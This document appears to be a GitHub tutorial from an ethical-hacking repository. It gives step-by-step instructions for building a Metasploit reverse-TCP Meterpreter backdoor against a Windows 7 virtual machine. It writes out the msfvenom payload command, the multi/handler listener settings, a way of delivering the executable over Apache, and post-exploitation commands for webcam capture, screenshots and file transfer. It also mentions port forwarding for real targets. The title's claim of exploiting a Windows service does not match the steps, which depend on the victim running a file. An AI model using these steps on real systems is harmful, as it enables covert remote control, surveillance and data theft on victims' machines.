# Creating backdoor in windows 7 using vulnerabilities in one of its services.

## What is a Backdoor?
- Backdoors are malicious files that contain Trojan or other infectious applications that can give you either Halt the processes of the machine or it may give us partial remote access to the Machine.
- We will be getting a reverse TCP connection from the victim machine by using a small **backdoor** using **Metasploit Framework**.

## REQUIREMENTS 
- KALI LINUX/Parrot OS.
- WINDOWS 7 OS VIRTUAL MACHINES.
- VMware.

## TERMS
- LHOST = Listening host (kali IP).
- LPORT = Listening Port( kali port number).
- Payload = Backdoor file which is going to be used for the OS like Windows, Linux, Mac, Android.
  

<br>

### Step 1

Start up your kali Linux and Windows 7 systems as Two Virtual Machines.

<hr>

### Step 2
First of all check your IP of kali machine for further use. 
```linux
Run ifconfig
```
<br>

![Step 2](https://github.com/mohitpanthri/Ethical-Hacking/assets/99413629/4ecc4926-4e01-4a95-94cd-ee19c7ecf576)

<hr>

### Step 3
In the terminal window of kali linux type ```msfconsole``` then wait for it to open, in the mean time open another terminal window to create a payload using ```msfvenom```.
- **MSFCONSOLE** – It’s a centralized console which gives you access with Multiple attacking vectors, exploits, and auxiliaries to exploit a machine in various ways.
- **MSFVENOM** – A tool used to create payload of backdoor, it is already a part of Metasploit framework used to to create and exploit tools in various ways and techniques.
<br>

![Step 3](https://github.com/mohitpanthri/Ethical-Hacking/assets/99413629/c095ee8a-87ed-4d62-9727-105351ba2916)

<hr>

### Step 4
In msfvenom window type the command as below.
```linux
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your linux IP) -f exe > /root/Desktop/victim.exe
```
- **Note:** Remove the () when you write your IP.
<br>

![Step 4](https://github.com/mohitpanthri/Ethical-Hacking/assets/99413629/06f9c2d5-1c46-497a-a282-87601e4fea5c)

<hr>

### Step 5
Now in msfcosole tab use below commands to make a listener for the connection. (we can use net cat also).

```
use exploit/multi/handler
```
- This is a wild card listener used to listen for active connection from the victim.

```
set payload windows/meterpreter/reverse_tcp
```
- This a payload is same as that we used in msfvenom for backdoor. It is a stager payload(You don’t need to be an active listener in msfconsole when victim runs the payload-backdoor.
  
- ```show options``` This command will help you to make sure of the requirements for a connection.

```
set LHOST (KALI IP-your ip ADDRESS)
set LPORT 4444 (kali port number in which we need to make the connection)
```

then type ```RUN``` or ```EXPLOIT```.
<br>
```WE ARE NOW LISTENING FOR THE CONNECTIONS ON PORT 4444.```
<br>

![Step 5](https://github.com/mohitpanthri/Ethical-Hacking/assets/99413629/9d11d9a9-b2bb-4d9b-a83d-96b35d7901a4)


<hr>

### Step 6
Now we are going to send the payload to victim’s machine by using default apache server in kali Linux. In real time task we need to do port forwarding in routers along with Public IP. 
Since My both machines are in same network I will be hosting a local server to share the file from kali to windows.

<hr>

### Step 7
First copy the payload file from Desktop to this location ```/var/www/html```.
<br>
Then now we can start our apache server using this command.
```
service apache2 start
```
<br>

![Step 7](https://github.com/mohitpanthri/Ethical-Hacking/assets/99413629/a202b364-a4eb-4e92-8838-ef798c080863)

<hr>

### Step 8
Now switch to Windows 7 Machine then type your kali IP in the browser then download it and run it.
<br>

![Step 8 a](https://github.com/mohitpanthri/Ethical-Hacking/assets/99413629/42a693c0-4945-4f5a-9d59-96422dc7dfdb)

![Step 8 b](https://github.com/mohitpanthri/Ethical-Hacking/assets/99413629/2aa0a70f-a4dd-428a-88d9-40ed4fa2034f)

<hr>

### Step 9
Now Switch to Kali to see whether the Meterpreter session is opened or not with the reverse connection from the victim machine.
<br>
**Your Reverse Connection must be successfull**.
<br>

![Step 9](https://github.com/mohitpanthri/Ethical-Hacking/assets/99413629/853c7798-7741-4974-a5ce-67c3d9469d03)

<hr>

### Step 10
**POST EXPLOITATION using METERPRETER commands like**
```sysinfo```,```pwd```,```id```,```cd```,```Upload```,```Download```.

- We can use lot of meterpreter commands like ```webcam_snap```, to use victim machine as we want.
- Type ``help`` to see list of commands you can use.
- MSFVENOM gives lot of various Payload depends on the usage of attackers approaches, He/She can use ```VNCinject``` payload also to retrieve the remote Screen of the victim Machine.
- We can use Reverse HTTPS connection also if the ports were blocked.

### Below is an example to save the screenshot of victim's computer

![Screenshot of Victim 1](https://github.com/mohitpanthri/Ethical-Hacking/assets/99413629/14cd6a7e-7f66-42a5-b95b-142ce5c29137)

![Screenshot of Victim 2](https://github.com/mohitpanthri/Ethical-Hacking/assets/99413629/055ce31a-7dfc-41ac-89a0-0bf7664dcbfd)

![Screenshot of Victim proof](https://github.com/mohitpanthri/Ethical-Hacking/assets/99413629/aec48478-9a78-415b-ae18-343342becb94)
